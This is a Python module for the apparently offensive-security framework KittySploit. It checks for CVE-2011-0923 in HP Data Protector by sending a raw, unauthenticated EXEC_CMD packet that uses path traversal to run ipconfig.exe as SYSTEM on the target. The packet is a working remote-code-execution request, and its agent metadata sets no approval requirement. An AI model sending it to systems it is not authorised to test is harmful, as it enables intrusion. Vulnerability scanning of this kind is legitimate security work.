#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""HP Data Protector EXEC_CMD RCE (CVE-2011-0923)."""

import socket
import time

from kittysploit import *
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client


class Module(Scanner, Tcp_scanner_client):
    __info__ = {
        'name': 'HP Data Protector - EXEC_CMD RCE Detection (CVE-2011-0923)',
        'description': (
            'Detects CVE-2011-0923 by sending an EXEC_CMD omniback request that runs '
            'windows\\system32\\ipconfig.exe and matching IP configuration output.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'scanner', 'tcp', 'hp', 'data-protector', 'cve', 'cve2011', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2011-0923',
        ],
        'cve': 'CVE-2011-0923',
    }

    port = OptPort(5555, 'HP Data Protector port', True)

    def run(self):
        host = self._host()
        port = self._port()
        if not host or not self.is_tcp_open(host, port):
            return False
        try:
            sock = socket.create_connection((host, port), timeout=self._timeout())
            sock.settimeout(max(8, self._timeout()))
            sock.sendall(b'\x00\x00\x00\xa4 2\x00 fdiskyou\x00 0\x00 SYSTEM\x00 fdiskyou\x00 C\x00 20\x00 fdiskyou\x00 Poc\x00 NTAUTHORITY\x00 NTAUTHORITY\x00 NTAUTHORITY\x00 0\x00 0\x00 ../../../../../../../../../../\\windows\\system32\\ipconfig.exe\x00\x00')
            time.sleep(2)
            chunks = []
            while True:
                try:
                    chunk = sock.recv(4096)
                except socket.timeout:
                    break
                if not chunk:
                    break
                chunks.append(chunk)
            sock.close()
            data = b''.join(chunks).decode('latin-1', errors='replace')
            printable = ''.join(c for c in data if ord(c) >= 61)
        except Exception:
            return False
        if 'WindowsIPConfiguration' in printable and 'EthernetadapterLocalAreaConnection' in printable:
            self.set_info(
                severity='critical',
                reason='HP Data Protector EXEC_CMD RCE (CVE-2011-0923)',
                path=f'tcp/{port}',
            )
            return True
        return False
